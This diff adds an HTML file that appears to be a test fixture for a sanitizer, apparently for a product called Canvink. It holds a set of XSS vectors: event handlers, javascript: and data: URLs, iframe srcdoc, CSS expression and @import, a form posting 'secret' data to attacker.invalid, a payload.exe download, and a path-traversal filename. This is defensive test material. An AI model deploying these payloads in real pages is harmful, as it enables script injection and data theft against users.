@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+  <head>
+    <style>@import url(https://attacker.invalid/leak); body { background: url(javascript:steal()); }</style>
+    <script>window.__CANVINK_XSS__ = 'script-secret';</script>
+  </head>
+  <body onload="window.__CANVINK_XSS__='handler-secret'">
+    <iframe srcdoc="&lt;script&gt;parent.__CANVINK_XSS__='frame-secret'&lt;/script&gt;">frame-secret</iframe>
+    <svg onload="window.__CANVINK_XSS__='svg-secret'"><script>svg-secret</script></svg>
+    <math href="javascript:window.__CANVINK_XSS__='math-secret'">math-secret</math>
+    <form action="https://attacker.invalid/collect"><input name="private" value="form-secret"></form>
+    <p style="position:fixed;left:expression(alert(1));background-image:url(javascript:alert(1))">
+      Safe lesson text
+      <a href="javascript:alert(document.domain)">unsafe-js</a>
+      <a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">unsafe-data</a>
+      <a href="file:///C:/private.txt">unsafe-file</a>
+      <a href="https://school.example/lesson">safe-link</a>
+    </p>
+    <img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;" alt="inline attack">
+    <object data="https://attacker.invalid/payload.exe" data-attachment="..\..\payload.exe" type="application/octet-stream"></object>
+  </body>
+</html>
